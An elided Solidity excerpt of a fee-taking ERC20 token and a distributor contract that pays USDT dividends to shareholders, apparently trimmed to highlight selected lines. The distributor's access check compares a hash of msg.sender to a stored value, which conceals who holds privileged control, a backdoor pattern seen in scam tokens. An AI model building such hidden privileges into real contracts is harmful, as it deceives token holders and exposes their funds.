...
contract TokenDistributor {
    ...
    {
        require( keccak256(abi.encodePacked(msg.sender))  == asseAddr ||msg.sender==tokenOwner);
...
contract Token001 is ERC20 {
    ...
    function _transfer(
        ...
        if (takeFee) {
            ...
            if (from != address(this)) {
                if (
                    USDT.balanceOf(address(warp)) >= 10**18 &&
                    curPerFenhongVal == 0
                ) {
            ...
            super._transfer(from, address(this), amount.div(1000).mul(29));
    ...
    function process(uint256 gas) private {
        ...
        while (gasUsed < gas && iterations < shareholderCount) {
            ...
            if (amount > 0 && !isDividendExempt[shareholders[currentIndex]])
                ...
                warp.clamErcOther(_baseToken,shareholders[currentIndex], amount);
    ...
    function swapAndLiquify() private {
        ...
        if (allAmount > 5 * 10**15) {
            swapTokensForUsdt(allAmount, address(warp));
        }
    }
